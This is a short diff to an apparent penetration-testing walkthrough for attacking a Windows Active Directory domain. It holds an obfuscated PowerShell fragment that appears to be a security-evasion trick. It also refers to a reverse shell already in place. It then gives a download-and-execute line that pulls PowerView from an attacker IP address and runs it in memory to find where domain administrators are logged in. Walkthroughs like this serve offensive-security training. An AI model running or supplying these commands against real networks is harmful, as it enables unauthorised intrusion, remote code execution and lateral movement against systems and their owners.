@@ -182,5 +182,5 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-
 ```
 Now download powerview on the reverse shell to enumerate the machines where the domain admin is logged in
 ```powershell
-iex ((New-Object Net.WebClient).DownloadString('http://172.16./PowerView.ps1'))
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.ps1'))
 ```
